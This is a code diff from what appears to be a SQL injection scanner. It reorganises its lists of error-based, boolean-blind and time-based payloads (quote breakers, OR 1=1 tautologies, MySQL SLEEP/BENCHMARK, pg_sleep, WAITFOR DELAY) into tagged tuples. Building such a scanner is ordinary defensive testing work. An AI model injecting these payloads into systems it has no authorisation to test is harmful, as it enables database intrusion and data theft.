@@ -49,65 +49,56 @@ SQL_ERROR_PATTERNS = [
 ]
 
 # Simple payloads designed to trigger database errors.
-# These will be injected into parameters to test for error-based SQLi.
-# More complex payloads for other techniques will be added later.
+# Each tuple is (payload_string, family_tag)
 ERROR_BASED_PAYLOADS = [
-    "'",
-    "''",
-    "\"",
-    "\\",
-    "`",
-    "--",
-    "';--",
-    " OR 1=1", # Can sometimes trigger errors on poorly configured systems
-    # Payloads from payloadbox/sql-injection-payload-list
-    " OR 1=1#",
-    " OR 1=1--",
-    " HAVING 1=1",
-    " AND 1=1",
-    " ORDER BY 1",
+    ("'", "QUOTE_SINGLE"),
+    ("''", "QUOTE_SINGLE_ESCAPED"),
+    ("\"", "QUOTE_DOUBLE"),
+    ("\\", "BACKSLASH"),
+    ("`", "QUOTE_BACKTICK"),
+    ("--", "COMMENT_HYPHEN"),
+    ("';--", "COMMENT_HYPHEN_TERMINATED"),
+    (" OR 1=1", "TAUTOLOGY_OR"),
+    (" OR 1=1#", "TAUTOLOGY_OR_COMMENT"),
+    (" OR 1=1--", "TAUTOLOGY_OR_COMMENT"),
+    (" HAVING 1=1", "HAVING_CLAUSE"),
+    (" AND 1=1", "TAUTOLOGY_AND"),
+    (" ORDER BY 1", "ORDER_BY"),
 ]
 
 # Payloads for Boolean-Based Blind SQLi.
-# Each item is a tuple containing two payloads: (true_condition, false_condition).
-# These are designed to be appended to a parameter to check for differences in response.
+# Each tuple is (true_payload, false_payload, family_tag)
 BOOLEAN_BASED_PAYLOADS = [
-    (" AND 1=1", " AND 1=2"),
-    (" OR 1=1", " OR 1=2"),
-    (" AND 'a'='a'", " AND 'a'='b'"),
-    (" OR 'a'='a'", " OR 'a'='b'"),
-    # Payloads with comments for query termination
-    (" AND 1=1-- ", " AND 1=2-- "),
-    (" OR 1=1-- ", " OR 1=2-- "),
-    ("' AND 1=1-- ", "' AND 1=2-- "),
-    ("' OR 1=1-- ", "' OR 1=2-- "),
-    ('" AND 1=1-- ', '" AND 1=2-- '),
-    ('" OR 1=1-- ', '" OR 1=2-- '),
-    # Payloads from payloadbox/sql-injection-payload-list
-    (" AND 1 LIKE 1", " AND 1 LIKE 2"),
-    (" AND 1 RLIKE 1", " AND 1 RLIKE 0"),
+    (" AND 1=1", " AND 1=2", "LOGICAL"),
+    (" OR 1=1", " OR 1=2", "LOGICAL"),
+    (" AND 'a'='a'", " AND 'a'='b'", "COMPARISON_STR"),
+    (" OR 'a'='a'", " OR 'a'='b'", "COMPARISON_STR"),
+    (" AND 1=1-- ", " AND 1=2-- ", "LOGICAL_COMMENT"),
+    (" OR 1=1-- ", " OR 1=2-- ", "LOGICAL_COMMENT"),
+    ("' AND 1=1-- ", "' AND 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
+    ("' OR 1=1-- ", "' OR 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
+    (" AND 1 LIKE 1", " AND 1 LIKE 2", "COMPARISON_LIKE"),
 ]
 
 # Payloads for Time-Based Blind SQLi.
-# A more robust and varied list to improve detection chances.
+# Each tuple is (payload_string, sleep_duration, family_tag)
 TIME_BASED_PAYLOADS = [
     # MySQL / MariaDB
-    ("AND SLEEP({sleep})", 5),
-    ("OR SLEEP({sleep})", 5),
-    ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5),
-    ("' AND SLEEP({sleep}) AND '1'='1", 5),
-    ("AND BENCHMARK({sleep}000000,MD5(1))", 5),
-    ("OR BENCHMARK({sleep}000000,MD5(1))", 5),
-
+    ("AND SLEEP({sleep})", 5, "MYSQL_SLEEP"),
+    ("OR SLEEP({sleep})", 5, "MYSQL_SLEEP"),
+    ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5, "MYSQL_SLEEP_SUBSELECT"),
+    ("' AND SLEEP({sleep}) AND '1'='1", 5, "MYSQL_SLEEP"),
+    ("AND BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),
+    ("OR BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),
 
     # PostgreSQL
-    ("AND (SELECT pg_sleep({sleep}))", 5),
-    ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5),
-    ("pg_sleep({sleep})", 5),
+    ("AND (SELECT pg_sleep({sleep}))", 5, "PGSQL_SLEEP"),
+    ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5, "PGSQL_SLEEP"),
+    ("pg_sleep({sleep})", 5, "PGSQL_SLEEP"),
 
     # SQL Server
-    ("AND WAITFOR DELAY '0:0:{sleep}'", 5),
-    ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5),
+    ("AND WAITFOR DELAY '0:0:{sleep}'", 5, "MSSQL_WAITFOR"),
+    ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5, "MSSQL_WAITFOR"),
 ]
 
 # MSSQL Specific Payloads (b64 encoded)
